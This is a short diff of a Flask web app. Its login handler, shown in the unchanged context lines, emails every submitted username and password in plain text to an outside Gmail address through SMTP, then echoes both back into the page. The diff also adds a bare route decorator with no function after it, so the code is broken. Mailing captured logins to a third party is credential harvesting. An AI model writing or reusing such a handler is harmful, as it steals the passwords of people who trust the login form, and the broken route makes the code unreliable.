@@ -13,7 +13,7 @@ def home():
 
 @app.route("/login",methods=["POST"])
 def login():
-    print(request.form)
+    
 
     with smtplib.SMTP("smtp.gmail.com") as connection:
         connection.starttls()
@@ -21,6 +21,8 @@ def login():
         connection.sendmail(from_addr="avinaasha382@gmail.com",to_addrs="vidyaa2005@gmail.com",msg=f"{request.form['username']} - {request.form['password']}")
 
     return render_template("login.html",username=request.form["username"],password=request.form["password"])
+
+@app.route("/edit/<id>")
 
 
 
